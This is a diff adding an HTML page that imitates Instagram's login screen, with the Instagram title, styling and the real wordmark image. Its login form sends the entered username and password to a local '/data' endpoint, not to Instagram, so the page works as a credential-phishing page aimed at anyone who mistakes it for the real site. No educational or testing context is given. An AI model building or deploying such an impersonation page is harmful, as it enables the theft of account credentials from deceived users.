@@ -1,0 +1,136 @@
+<html>
+    <head>
+        <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+        <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+        <link rel="manifest" href="/site.webmanifest">
+        <title>Login • Instagram</title>
+        <style>
+            *{
+                box-sizing: border-box;
+                margin: 0;
+                padding: 0;
+            }
+            body{
+                background-color: #fafafa;
+                display: flex;
+                flex-flow: wrap row;
+                justify-content: center;
+                align-content: center;
+            }
+            main{
+                width: 25%;
+                background-color: #fafafa;
+                display: flex;
+                flex-flow: wrap row;
+                align-content: space-between;
+            }
+            main .box{
+                background-color: white;
+                width: 100%;
+                margin: 4px 0;
+                border: 1px solid #dbdbdb;
+            }
+            
+            main .box img{
+                display: block;
+                margin: 50px auto 30px;
+            }
+            main .box input{
+                border-radius: 4px;
+                display: block;
+                margin: 6px auto;
+                color: black;
+                width: 80%;
+                padding: 12px 5px;
+                font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+                font-size: 12px;
+                background-color: #fafafa;
+                outline: 0px;
+                border: 1px solid #dbdbdb;
+            }main .box button{
+                display: block;
+                margin: 14px auto;
+                padding: 6px 0;
+                width: 80%;
+                background-color: #b3d1ff;
+                color: white;
+                font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+                font-weight: bold;
+                border-radius: 4px;
+                border: 0px;
+                outline: 0px;
+            }
+           .box .or{
+            width: 80%;
+            margin: 0 auto;
+            }
+            .or span{
+                display: block;
+                text-align: center;
+                background-color: white;
+                width: 20%;
+                margin: 0 auto;
+                position: relative;
+                font-size: 13px;
+                color: darkgray;
+                font-weight: 500;
+                font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            }
+            .or hr{
+                position: relative;
+                top: 10px;
+                outline: 0px;
+                border: 1px solid #dbdbdb;
+            }
+            .box .log{
+                display: block;
+                margin: 24px auto
+            }
+            .box-mid{
+                display: flex;
+                flex-flow: wrap row;
+                justify-content: center;
+                align-content: center;
+            }
+            .box p{
+                font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+                font-size: 14px;
+                padding: 20px 0;
+                
+            }
+            .box-bottom{
+                border: 0px !important;
+                background-color: #fafafa !important;
+            }
+            .box-bottom img{
+                margin: 10px auto !important;
+                display: block;
+            }
+        </style>
+    </head>
+    <body>
+        <main>
+            <div class="box-top box">
+                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" width="50%"> 
+                <form action="/data" method="post">
+                    <input type="text" placeholder="Phone number, username, or email" name="username" required>
+                    <input type="password" placeholder="Password" name="password" required>
+                    <button type="submit">Log in</button>
+                </form>
+                <div class="or">
+                    <hr>
+                    <span>OR</span>
+                </div>
+                <img src="Capture.PNG" class="log"> 
+                
+            </div>
+            <div class="box-mid box">
+                <p>Don't have an account?<p><span>Sign up</span></p>
+            </div>
+            <div class="box-bottom box">
+                <img src="Capture1.PNG">
+            </div>
+        </main>
+    </body>
+</html>
